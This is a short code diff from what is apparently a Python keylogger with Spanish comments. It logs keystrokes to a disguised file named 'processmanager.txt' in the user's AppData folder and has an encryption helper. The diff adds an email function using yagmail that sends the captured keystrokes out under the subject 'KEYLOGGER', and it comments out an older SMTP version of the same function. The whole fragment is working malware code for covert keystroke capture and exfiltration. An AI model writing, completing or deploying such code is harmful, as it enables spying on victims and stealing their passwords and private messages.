@@ -10,6 +10,15 @@ path = os.environ['appdata'] +'\\processmanager.txt'
 
 def cifrar(texto, clave): return Fernet(clave).encrypt(texto)
 
+def enviar_correo(sender, recipient, message):
+    sender_email, sender_password = sender
+    # Crear el objeto yagmail.SMTP con las credenciales del remitente
+    yag = yagmail.SMTP(user=sender_email, password=sender_password)
+    # Enviar el correo electrónico
+    yag.send(to=recipient, subject="KEYLOGGER", contents=message)
+
+
+"""
 def enviar_correo(sender, recipien, message):
     sender_email, sender_password = sender
     # Configuración del servidor SMTP de Gmail
@@ -24,6 +33,8 @@ def enviar_correo(sender, recipien, message):
     server.sendmail(sender_email, recipient, message)
     # Cerrar conexión con el servidor SMTP
     server.quit()
+"""
+
 
 def on_press(key):
     global keys, count
